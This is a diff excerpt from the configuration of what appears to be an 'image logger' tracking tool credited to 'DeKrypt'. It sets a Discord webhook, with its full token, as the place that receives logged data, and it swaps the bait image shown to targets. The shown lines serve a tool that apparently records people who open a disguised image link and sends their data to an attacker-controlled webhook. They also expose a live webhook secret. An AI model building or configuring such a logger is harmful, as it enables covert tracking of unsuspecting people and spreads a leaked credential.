@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1465932804905766933/Rd2MBdn_QQk_Ajgz4fACf9UfSnn8iinrYqS9XIe0wk2y10RrV37UVatZhS9A-KLQpBRH",
-    "image": "https://www.pngmart.com/files/11/Green-Dank-Meme-PNG-Free-Download.png", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/22/b7/3d/22b73ddfc4cbe22a4a6a4799bb37488b.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
